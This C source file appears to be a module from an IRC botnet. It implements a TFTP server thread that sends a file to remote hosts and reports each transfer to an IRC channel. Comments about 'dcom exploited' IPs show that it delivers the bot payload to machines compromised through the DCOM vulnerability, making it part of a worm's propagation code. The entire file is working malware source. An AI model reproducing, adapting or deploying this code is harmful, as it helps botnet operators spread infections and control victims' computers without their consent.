#include "includes.h"
#include "functions.h"
#include "externs.h"

DWORD WINAPI tftpserver(LPVOID pParam) 
{ 
	FILE *fid;
	SOCKADDR_IN s_in;

	char sendbuf[IRCLINE], buffer[128], type[]="octet", IP[18];
	int err=1; 

	tftpd tftp = *(tftpd *)pParam;
	tftpd *tftps = (tftpd *)pParam;
	tftps->info = TRUE;
	tftp.threads++; 

	SOCKET server=fsocket(AF_INET, SOCK_DGRAM, 0); 
	threads[tftp.threadnum].sock=server;

	s_in.sin_addr.s_addr = INADDR_ANY; 
	s_in.sin_port = fhtons((unsigned short)threads[tftp.threadnum].port); 
	s_in.sin_family = AF_INET; 

	if((fbind(server, (struct sockaddr*)&s_in, sizeof(s_in))) == SOCKET_ERROR) { 
		Sleep(5000); 
		tftp.threads--; 

		return tftpserver(pParam); 
	} 

	if ((fid=fopen(tftp.filename, "rb")) == NULL) {
		Sleep(400);
		sprintf(sendbuf,"[SEND] Missing file: %s",tftp.filename);
		irc_privmsg(tftp.socket,tftp.chan,sendbuf,tftp.notice);

		clearthread(tftp.threadnum);

		ExitThread(0);
	}

	while(err>0 && tftps->info && fid) { 
		TIMEVAL to; 
		to.tv_sec=5; 
		to.tv_usec=5000; 

		fd_set fd; 
		FD_ZERO(&fd); 
		FD_SET(server,&fd); 

		memset(buffer,0,sizeof(buffer)); 
		if(fselect(0,&fd,NULL,NULL,(const struct timeval*)&to) > 0) { 
			SOCKADDR_IN c_in; 
			int c_len=sizeof(c_in); 
			char f_buffer[BLOCKSIZE+4]=""; 
			
			err=frecvfrom(server, buffer, sizeof(buffer), 0, (struct sockaddr*)&c_in, &c_len); 
			sprintf(IP,finet_ntoa(c_in.sin_addr));
        
			// parse buffer
			if(buffer[0]==0 && buffer[1]==1) { //RRQ
				char *tmprequest=buffer,*tmptype=buffer;
				tmprequest+=2; //skip the opcode
				tmptype+=(strlen(tftp.requestname)+3); //skip the opcode and request name + NULL
				if(strncmp(tftp.requestname,tmprequest,strlen(tftp.requestname)) != 0||strncmp(type,tmptype,strlen(type)) != 0) { 
					fsendto(server, "\x00\x05\x00\x01\x46\x69\x6C\x65\x20\x4E\x6F\x74\x20\x46\x6F\x75\x6E\x64\x00", 19, 0, (const struct sockaddr*)&c_in,c_len); 
				} else { // good rrq packet send first data packet 
					fseek(fid, 0, SEEK_SET); 
					f_buffer[0]=0; f_buffer[1]=3; // DATA
					f_buffer[2]=0; f_buffer[3]=1; // DATA BLOCK #
					err=fread(&f_buffer[4], 1, BLOCKSIZE, fid); 
					fsendto(server, f_buffer, err + 4, 0, (const struct sockaddr*)&c_in, c_len);
					////////////////////
					// dont show transfer started msg
					///////////
					sprintf(sendbuf,"[SEND]: Sending file to: %s", IP);
					irc_privmsg(tftp.socket,tftp.chan,sendbuf,tftp.notice);
				} 
			} else if(buffer[0]==0 && buffer[1]==4) { // ACK 
				// send next packet 
				unsigned int blocks; 
				BYTE b1=buffer[2],b2=buffer[3]; // ACK BLOCK #

				f_buffer[0]=0; f_buffer[1]=3;	// DATA
				if (b2==255) {					// DATA BLOCK #
					f_buffer[2]=++b1;
					f_buffer[3]=b2=0;
				} else {
					f_buffer[2]=b1;
					f_buffer[3]=++b2;
				}

				blocks=(b1 * 256) + b2 - 1; 
				// remember to subtract 1 as the ACK block # is 1 more than the actual file block #
				fseek(fid, blocks * BLOCKSIZE, SEEK_SET); 
				err=fread(&f_buffer[4], 1, BLOCKSIZE, fid); 
				fsendto(server, f_buffer, err + 4, 0, (const struct sockaddr*)&c_in, c_len);
				if (!err) {
					///////////////////
					// replaced with dcom exploited msg
					/////////////
					sprintf(sendbuf,"[SEND]: file sent complete to: %s", IP);
					irc_privmsg(tftp.socket,tftp.chan,sendbuf,tftp.notice);
					addlog(sendbuf);
					//if (!tftp.silent)
					//{
					//	sprintf(sendbuf,"[dcom] Exploited IP: %s", IP);
					//	irc_privmsg(tftp.socket,tftp.chan,sendbuf,tftp.notice);
					//}
				}
			} else { // we dont support any other commands 
				fsendto(server, "\x00\x05\x00\x04\x6B\x74\x68\x78\x00",9, 0, (const struct sockaddr*)&c_in, c_len); 
			} 
		} else 
			continue;
	}
	// check for ack, then msg irc on transfer complete

	fclosesocket(server); 
	fclose(fid); 

	tftp.threads--; 
	if(tftps->info == FALSE) {
		clearthread(tftp.threadnum);

		ExitThread(0); 
	}
	Sleep(1000);
   
	return tftpserver(pParam); 
} 

